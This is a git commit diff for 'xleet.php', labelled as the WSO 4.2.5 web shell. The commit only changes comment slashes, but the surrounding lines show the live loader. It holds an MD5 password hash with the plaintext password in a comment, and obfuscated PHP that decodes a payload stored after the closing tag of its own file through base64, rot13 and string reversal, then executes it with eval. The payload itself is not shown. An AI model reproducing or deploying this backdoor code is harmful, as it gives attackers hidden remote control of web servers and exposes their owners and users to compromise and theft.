6a14a9bb04d8d519823f83df042ab2917427d8a8
v3n0m <88527426+v3n0miq@users.noreply.github.com>
2021-08-12 15:46:57 +0300

    Update xleet.php
    wso 4.2.5 shell

--- xleet.php
+++ xleet.php
@@ -1,6 +1,6 @@
 <?php
-////xleet.php
-////wso shell 4.2.5
+/////xleet.php
+/////wso shell 4.2.5
 $password = "59e8d97dbcc1d0f65dea6ecd0e9fbe39"; ////pass=xleet You can change the md5 password
 $bn_d7624002cad982b3=array(base64_decode("L3gvaQ=="),base64_decode("eA=="),base64_decode(strrev(str_rot13(explode(base64_decode("Pz4="),file_get_contents(__FILE__))[1]))));preg_replace($bn_d7624002cad982b3[0],serialize(eval($bn_d7624002cad982b3[2])),$bn_d7624002cad982b3[1]);exit();
 ?>
